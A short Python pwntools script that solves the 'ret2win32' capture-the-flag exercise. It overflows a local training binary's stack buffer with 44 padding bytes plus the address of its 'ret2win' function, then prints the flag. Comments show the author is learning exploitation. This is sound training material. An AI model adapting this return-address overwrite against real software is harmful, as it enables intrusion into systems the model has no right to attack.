import pwn

from pwn import *

elf = ELF('./ret2win32')
p = process('./ret2win32')

input_init = p.recv()
#print(input_init)

# GET THE OFFSET FROM GET_OFFSET 
offset = 44 #cyclic_find(core.fault_addr)

log.success("We have found the offset at location " + str(offset))

addr_to_ret2win = elf.symbols['ret2win']

log.info("Address of ret2win is " + hex(addr_to_ret2win))
# I also know that I can just write the address from GDB, but I'm trying to learn

lit_end_addr_to_ret2win = p32(addr_to_ret2win)

payload = b"A"*offset + lit_end_addr_to_ret2win
p.sendline(payload)

flag = p.recvuntil("}") #Keep input pipe open until we receive the whole flag
print(flag)